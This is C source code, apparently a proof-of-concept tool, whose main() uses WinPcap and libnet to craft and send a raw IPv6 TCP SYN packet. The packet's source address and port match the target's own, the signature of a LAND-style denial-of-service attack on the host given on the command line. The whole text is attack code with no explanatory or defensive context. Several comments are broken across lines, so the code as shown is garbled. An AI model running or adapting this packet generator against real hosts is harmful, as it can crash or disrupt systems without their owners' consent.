int main(int argc, char* argv[])
{
if ( argc<4 )
{
usage(argv[0]);
return EXIT_FAILURE;
}

int retVal;
struct addrinfo hints,*addrinfo;

ZeroMemory(&hints,sizeof(hints));

WSADATA wsaData;
if ( WSAStartup( MAKEWORD(2,2), &wsaData ) != NO_ERROR )
{
fprintf( stderr, "Error in WSAStartup():%d\n",WSAGetLastError());
return EXIT_FAILURE;
}
//
// Get MAC address of remote host (assume link local IpV6 address)
//

hints.ai_family = PF_INET6;
hints.ai_socktype = SOCK_STREAM;
hints.ai_protocol = IPPROTO_TCP;
hints.ai_flags = AI_PASSIVE;

retVal = getaddrinfo(argv[2],0, &hints, &addrinfo);
if ( retVal!=0 )
{
WSACleanup();
fprintf( stderr, "Error in getaddrinfo():%d\n",WSAGetLastError());
exit(EXIT_FAILURE);
}

//
// Open WinPCap adapter
//
if ( (pcap_handle = pcap_open_live (argv[1], 1514, PCAP_OPENFLAG_PROMISCUOUS, 
100, (char*)errbuf)) == NULL )
{
freeaddrinfo(addrinfo);
WSACleanup();
fprintf(stderr, "Error opening device: %s\n",argv[1]);
return EXIT_FAILURE;
}

ZeroMemory(packet,sizeof(packet));
struct sockaddr_in6 *sa = (struct sockaddr_in6 *) addrinfo->ai_addr;

// fill ethernet header
eth_hdr->ether_dhost[0] = eth_hdr->ether_shost[0] = 0;// assume address like 
00:something;
eth_hdr->ether_dhost[1] = eth_hdr->ether_shost[1] = sa->sin6_addr.u.Byte[9];
eth_hdr->ether_dhost[2] = eth_hdr->ether_shost[2] = sa->sin6_addr.u.Byte[10];
eth_hdr->ether_dhost[3] = eth_hdr->ether_shost[3] = sa->sin6_addr.u.Byte[13];
eth_hdr->ether_dhost[4] = eth_hdr->ether_shost[4] = sa->sin6_addr.u.Byte[14];
eth_hdr->ether_dhost[5] = eth_hdr->ether_shost[5] = sa->sin6_addr.u.Byte[15];
eth_hdr->ether_type = 0xdd86;


// fill IP header
// source ip == destination ip

memcpy(ip6_hdr->ip_src.__u6_addr.__u6_addr8,sa->sin6_addr.u.Byte,sizeof(sa->sin6_addr.u.Byte));

memcpy(ip6_hdr->ip_dst.__u6_addr.__u6_addr8,sa->sin6_addr.u.Byte,sizeof(sa->sin6_addr.u.Byte));
ip6_hdr->ip_hl = 255;
ip6_hdr->ip_nh = IPPROTO_TCP;
ip6_hdr->ip_len = htons (20);
ip6_hdr->ip_flags[0] = 0x06 << 4;
srand((unsigned int) time(0));
// fill tcp header
tcp_hdr->th_sport = tcp_hdr->th_dport = htons (atoi(argv[3])); // source 
port equal to destination
tcp_hdr->th_seq = rand();
tcp_hdr->th_ack = rand();
tcp_hdr->th_off = htons(5);
tcp_hdr->th_win = rand();
tcp_hdr->th_sum = 0;
tcp_hdr->th_urp = htons(10);
tcp_hdr->th_off = 5;
tcp_hdr->th_flags = 2;
// calculate tcp checksum
int chsum = libnet_in_cksum ((u_int16_t *) & ip6_hdr->ip_src, 32);
chsum += ntohs (IPPROTO_TCP + sizeof (struct libnet_tcp_hdr));
chsum += libnet_in_cksum ((u_int16_t *) tcp_hdr, sizeof (struct 
libnet_tcp_hdr));
tcp_hdr->th_sum = LIBNET_CKSUM_CARRY (chsum);
// send data to wire
retVal = pcap_sendpacket (pcap_handle, (u_char *) packet, sizeof(packet));
if ( retVal == -1 )
{
fprintf(stderr,"Error writing packet to wire!!\n");
}
//
// close adapter, free mem.. etc..
//
pcap_close(pcap_handle);
freeaddrinfo(addrinfo);
WSACleanup();
return EXIT_SUCCESS;
}